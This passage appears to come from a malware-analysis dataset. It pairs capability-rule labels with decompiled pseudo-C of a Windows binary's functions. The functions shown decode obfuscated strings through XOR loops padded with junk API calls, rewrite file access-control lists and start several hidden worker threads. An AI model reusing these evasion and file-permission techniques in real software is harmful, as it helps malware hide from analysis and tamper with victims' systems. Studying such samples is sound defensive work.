>> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1190
    },
    "0040d341": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040d341(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_34ch;\n    uint var_144h;\n    uint var_104h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uchar var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_c4h = 0x208;\n    iVar2 = fcn.0040ca42();\n    if (iVar2 == 0) {\n        fcn.0040cc7b();\n        fcn.004018c4();\n        while ((iVar2 = fcn.00402615(),  iVar2 != 0 || (iVar2 = fcn.0040267f(),  iVar2 != 0))) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.XCIBD__O, 0x184, 0x40, &var_b4h);\n    if (iVar2 != 0) {\n        fcn.004050a0();\n        (*pcVar6)(str.XCIBD__O, 0x184, var_b4h, &var_b4h);\n    }\n    puVar7 = 0x41dd80;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.004013dd();\n    puVar9 = &var_5ch;\n    for (iVar2 = 0x1c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_c0h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar7 = 0x41dd68;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar9 = &var_34ch;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_34ch, &var_c4h);\n    var_38h = 6;\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar2 != 0) {\n        var_24h = 0x4e1e7125;\n        var_20h = 0x7122722b;\n        var_1ch = 0x722f4e03;\n        var_18h = 0x4e08713d;\n        var_14h._0_2_ = 0x726e;\n        var_8h = 0x4e4d7170;\n        var_4h._0_2_ = 0x726e;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar4 != 0x62dd04) {\n                *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar2)[&var_24h - iVar2];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar2, &var_34ch);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    iVar2 = fcn.00409e40();\n    var_3ch = 5;\n    if (iVar2 != 0) {\n        if (2 < var_5ch._1_1_) {\n            iVar2 = 0;\n            if (0 < var_5ch._1_1_ - 2) {\n                do {\n                    *0x41dd60 = *0x41dd60 + (&var_50h)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_5ch._1_1_ - 2);\n            }\n        }\n        *0x41dd60 = *0x41dd60 ^ 0x43103655;\n        iVar2 = fcn.0040cb26();\n        if (iVar2 != 0) {\n            if (*0x41daa8 < 6) {\n                var_b0h = 0x326e521c;\n                var_ach = 0x2b111f09;\n                var_a8h = 0x11754d0f;\n                var_a4h = 0x347d5363;\n                var_a0h = 0x2c707975;\n                var_9ch = 0x137b397d;\n                var_98h = 0x37015311;\n                var_94h = 0x29636b09;\n                var_90h = 0x111a5f08;\n                var_8ch = 0x350f2763;\n                var_88h = 0x291f6b7b;\n                var_84h = 0x11094d7d;\n                var_80h = 0x376e410d;\n                var_7ch = 0x2b111f09;\n                var_78h = 0x11754d0f;\n                var_74h = 0x347d5363;\n                var_70h._0_2_ = 0x7973;\n                var_70h._2_1_ = 0x58;\n                var_8h = 0x76466858;\n                var_4h._0_2_ = 0x5032;\n                uVar3 = (*pcVar6)(8, 0x44);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_40h = &var_b0h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n                    if (iVar4 != 0xe6f0df) {\n                        *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_40h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x43);\n            }\n            else {\n                var_24h = 0x20717120;\n                var_20h = 0x1770487e;\n                var_1ch = 0x7048093a;\n                var_18h = 0x731b3a15;\n                var_8h = 0x6d594b73;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x32);\n                uVar3 = (*pcVar6)(8, 0x11);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_40h = &var_24h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n                    if (iVar4 != 0x3485ae) {\n                        *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_3ch) ^ (iVar8 + iVar2)[var_40h];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x10);\n            }\n            var_c0h = 0xc;\n            var_b8h = 0;\n            var_bch = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar2, 1, &var_bch, 0);\n            uVar3 = (*pcVar6)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    *0x41dd74 = fcn.0040d1f0();\n    *0x41dd74 = *0x41dd74 & 0xffff;\n    var_20h = 0x2c10302a;\n    var_1ch = 0x10202c29;\n    var_18h = 0x2d232f17;\n    var_14h._0_2_ = 0x7307;\n    var_8h = 0x7375484f;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x5a);\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_6ch = &var_20h - iVar2;\n    var_40h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0xb2fb31) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_3ch) ^ (iVar8 + iVar2)[var_6ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    var_20h = 0x292a2512;\n    var_1ch = 0x243d000a;\n    var_18h = 0x250c0b29;\n    var_14h._0_2_ = 0x4726;\n    var_8h = 0x474b5161;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6e);\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_2ch = 0;\n    var_30h = &var_20h - iVar2;\n    var_6ch = iVar2;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar8 != 0xf466ca) {\n            *(var_2ch + iVar2) = *(&var_8h + var_2ch % var_3ch) ^ (var_2ch + iVar2)[var_30h];\n        }\n        var_2ch = var_2ch + 1;\n    } while (var_2ch < 0xe);\n    var_10h = 0x4d10036d;\n    var_ch._0_1_ = 0x54;\n    var_ch._1_1_ = 0x48;\n    var_64h = 0x684f7048;\n    var_60h._0_1_ = 0x30;\n    uVar3 = (*pcVar6)(8, 7);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_30h = &var_10h - iVar2;\n    var_8h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0xe095aa) {\n            *(iVar8 + iVar2) = *(&var_64h + iVar8 % var_3ch) ^ (iVar8 + iVar2)[var_30h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_104h, iVar2, var_40h, *0x413430);\n    *0x41dacc = fcn.0040512a();\n    *0x41dd74 = 6000;\n    var_2ch = var_2ch & 0xff000000 | 0x7a0f14;\n    var_10h = 0x757a6b31;\n    var_ch._0_1_ = 0x69;\n    var_ch._1_1_ = 0x79;\n    uVar3 = (*pcVar6)(8, 4);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_30h = &var_2ch - iVar2;\n    var_64h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar4 != 0x276d8) {\n            *(iVar8 + iVar2) = *(&var_10h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_30h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_144h, iVar2, *0x41dd74);\n    var_ch._0_1_ = 0x4f;\n    var_2ch = 0x48614d72;\n    var_28h = 0x4f;\n    var_10h = 0x2d143f06;\n    uVar3 = (*pcVar6)(8, 6);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_68h = &var_10h - iVar2;\n    var_30h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar4 != 0x1309b7) {\n            *(iVar8 + iVar2) = *(&var_2ch + iVar8 % var_3ch) ^ (iVar8 + iVar2)[var_68h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_1ch = 0x23242c17;\n    var_18h = 0x2316130d;\n    var_14h._0_2_ = 0x6223;\n    var_10h = 0x474a4961;\n    var_ch._0_1_ = 0x62;\n    uVar3 = (*pcVar6)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_2ch = &var_1ch - iVar2;\n    var_68h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar4 != 0xab5a2c) {\n            *(iVar8 + iVar2) = *(&var_10h + iVar8 % var_3ch) ^ (iVar8 + iVar2)[var_2ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_54h = 0x3c391400;\n    var_50h = 0x16024b40;\n    var_4ch = 0x56432135;\n    var_48h = 0x2022101b;\n    var_44h = 0x75085d59;\n    var_18h = 0x5250756d;\n    var_14h._0_2_ = 0x3930;\n    uVar3 = (*pcVar6)(8, 0x15);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_10h = &var_54h - iVar2;\n    var_2ch = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0x1e4fbd) {\n            *(iVar8 + iVar2) = *(&var_18h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_10h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    var_58h = 0x130c1126;\n    var_54h = 0xb3c1902;\n    var_50h = 0x1e111904;\n    var_4ch = 0x1f1832;\n    var_48h = 0x8040332;\n    var_44h = CONCAT31(var_44h._1_3_, 0x74);\n    var_38h = 0x77627074;\n    var_34h._0_1_ = 0x6d;\n    uVar3 = (*pcVar6)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_10h = &var_58h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar4 != 0x422186) {\n            *(iVar8 + iVar2) = *(&var_38h + iVar8 % var_3ch) ^ (iVar8 + iVar2)[&var_58h - iVar2];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_6ch, var_30h);\n    (*pcVar6)(var_68h, &var_104h);\n    (*pcVar6)(var_2ch, 0x413434);\n    (*pcVar6)(iVar2, &var_144h);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    puVar9 = puVar5;\n    for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar5 = 0x20;\n    *0x41da90 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar6 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x41dd80 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040ad5f, puVar5, 0, 0);\n    *0x41dd84 = (*pcVar6)(0, 0, fcn.0040a9c7, *0x41da98, 0, 0);\n    *0x41dd88 = (*pcVar6)(0, 0, fcn.00405d3d, puVar5, 0, 0);\n    *0x41dd8c = (*pcVar6)(0, 0, 0x40fe69, puVar5, 0, 0);\n    uVar3 = (*pcVar6)(0, 0, fcn.0040c565, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, var_2ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_68h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_30h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_64h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_8h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_6ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_40h);\n    (*pcVar6)(uVar3);\n    return 0;\n}\n",
        "token_count": 5233
    },
    "0040db6f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040db6f(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    code *pcVar11;\n    uchar *puVar12;\n    uint var_280h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t lpLibFileName;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    code *pszFirst;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    var_80h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar6)(uVar1 | 2);\n    var_24h = 0x1611093e;\n    var_20h = 0x7a735e38;\n    var_1ch = 0x4101183e;\n    var_10h = 0x5a54416d;\n    var_ch._0_1_ = 0x74;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_14h = 0x5;\n    iVar9 = 0;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar4 != 0x707487) {\n            *(iVar9 + iVar3) = *(&var_10h + iVar9 % var_14h) ^ (iVar9 + iVar3)[&var_24h - iVar3];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0xc);\n    var_28h = 0x1d030b35;\n    var_24h = 0x22001827;\n    var_20h = 0x30132819;\n    var_1ch = 0x11343101;\n    var_18h._0_2_ = 0x3912;\n    var_18h._2_1_ = 0x70;\n    var_10h = 0x706e6476;\n    var_ch._0_1_ = 0x46;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar9 = 0;\n    pszFirst = &var_28h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0x5fd2a7) {\n            *(iVar9 + iVar3) = *(&var_10h + iVar9 % var_14h) ^ (iVar9 + iVar3)[&var_28h - iVar3];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x13);\n    puVar10 = &var_280h;\n    for (iVar9 = 0x200; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    var_10h = (*pcVar6)(uVar2, &var_80h);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    pcVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pcVar11 = pcVar7;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *pcVar11 = 0x0;\n        pcVar11 = pcVar11 + 1;\n    }\n    pszFirst = pcVar7;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, pcVar7, 0x104);\n    var_44h = 0x494b4825;\n    var_40h = 0x483b4a07;\n    var_3ch = 0x4a5d495b;\n    var_38h = 0x4940482d;\n    var_34h = 0x48484a16;\n    var_1ch = 0x49384848;\n    var_18h._0_2_ = 0x4a73;\n    *0x41da98 = pcVar7;\n    uVar2 = (*pcVar8)(8, 0x29);\n    iVar3 = (*pcVar6)(uVar2);\n    iVar9 = 0;\n    lpLibFileName = &var_44h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        pcVar6 = pszFirst;\n        if (iVar4 != 0x42dda3) {\n            lpLibFileName = 6;\n            *(iVar9 + iVar3) = *(&var_1ch + iVar9 % 6) ^ (iVar9 + iVar3)[&var_44h - iVar3];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x14);\n    iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar3);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) goto code_r0x0040eca7;\n    uVar2 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0, pcVar6);\n    fcn.00403925(uVar2);\n    do {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x0040eca7:\n            if (1 < var_80h) {\n                *0x41da98 = *(var_10h + 4);\n            }\n            *0x41da9c = fcn.0040e927();\n            fcn.0040e515();\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            iVar3 = fcn.00401587();\n            (*_sym.imp.KERNEL32.dll_GetVersion)();\n            if (iVar3 != 1) break;\n            fcn.00403de1();\n            uVar2 = (*pcVar8)(0, pcVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        var_7ch = 0x44787016;\n        var_78h = 0x3920331c;\n        var_74h = 0x70724c00;\n        var_70h = 0x330d446d;\n        var_6ch = 0x4c183955;\n        var_68h = 0x4450707e;\n        var_64h = 0x3902332f;\n        var_60h = 0x70404c2b;\n        var_5ch = 0x332a4456;\n        var_58h = 0x4c183904;\n        var_54h = 0x4457707a;\n        var_50h = 0x39153338;\n        var_4ch = 0x705d4c36;\n        var_48h = 0x3338445c;\n        var_44h = 0x4c013950;\n        var_40h = 0x4449704b;\n        var_3ch = 0x391f3320;\n        var_38h = 0x70564c36;\n        var_34h = 0x3310444b;\n        var_30h._0_2_ = 0x3970;\n        pszFirst = 0x44397033;\n        var_4h._0_1_ = 0x4c;\n        uVar2 = (*pcVar8)(8, 0x9d);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar9 = 0;\n        lpLibFileName = iVar3;\n        var_10h = &var_7ch - iVar3;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar4 != 0x51681f) {\n                *(iVar9 + iVar3) = *(&pszFirst + iVar9 % var_14h) ^ (iVar9 + iVar3)[&var_7ch - iVar3];\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x4e);\n        var_58h = 0x741b4a43;\n        var_54h = 0x4839662f;\n        var_50h = 0x4a035600;\n        var_4ch = 0x66047425;\n        var_48h = 0x561b4825;\n        var_44h = 0x746d4a12;\n        var_40h = 0x481e660a;\n        var_3ch = 0x4a155615;\n        var_38h = 0x66257423;\n        var_34h = 0x56744816;\n        pszFirst = 0x74484a66;\n        var_4h._0_1_ = 0x56;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar9 = 0;\n        var_10h = &var_58h - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n            if (iVar4 != 0xb2cbbc) {\n                *(iVar9 + iVar3) = *(&pszFirst + iVar9 % var_14h) ^ (iVar9 + iVar3)[&var_58h - iVar3];\n            }\n            pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x28);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n        pcVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        pszFirst = pcVar6;\n        uVar2 = (*pcVar8)(8, 0x208);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        for (iVar9 = 0x208; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *pcVar6 = 0x0;\n            pcVar6 = pcVar6 + 1;\n        }\n        puVar12 = var_14h;\n        for (iVar9 = 0x208; pcVar6 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar12 = 0;\n            puVar12 = puVar12 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(lpLibFileName, pszFirst, 0x104);\n        (*pcVar6)(iVar3, var_14h, 0x104);\n        iVar3 = fcn.0040ca42();\n        if (iVar3 == 0) {\n            iVar3 = fcn.0040267f();\n            if (iVar3 == 0) {\n                iVar3 = fcn.0040282b();\n                if (iVar3 == 0) goto code_r0x0040eef2;\n            }\n        }\n        else {\ncode_r0x0040eef2:\n            pcVar11 = pszFirst;\n            pcVar6 = _sym.imp.SHLWAPI.dll_StrStrIW;\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41da98, pszFirst);\n            if (iVar3 != 0) {\ncode_r0x0040ef1e:\n                fcn.0040e82f();\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040d341, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                uVar2 = (*pcVar8)(0, pcVar11);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar8)(0, var_14h);\n                